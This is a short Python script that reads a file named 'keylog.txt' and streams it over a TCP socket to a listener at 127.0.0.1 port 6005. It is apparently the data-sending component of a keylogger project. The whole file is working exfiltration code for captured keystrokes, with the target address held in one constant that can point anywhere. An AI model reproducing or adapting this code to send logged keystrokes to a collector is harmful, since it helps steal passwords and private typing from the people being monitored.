#!/usr/bin/env python3

#Import Necessary Libraries
import socket

#Configure Parameters For File Transfer (IP,Port,Transfer Size)
TCP_IP = '127.0.0.1'
TCP_PORT = 6005
BUFFER_SIZE = 1024

#Configure The Socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((TCP_IP,TCP_PORT))

#Transfer The File 'keylog.txt'
f = open('keylog.txt','rb')
print('Sending...')
l = f.read(BUFFER_SIZE)

while(l):
    print('Sending...')
    s.send(l)
    l = f.read(1024)

#Close The Socket
f.close()
print('Done Sending')
s.shutdown(socket.SHUT_WR)
print(s.recv(1024))
s.close()
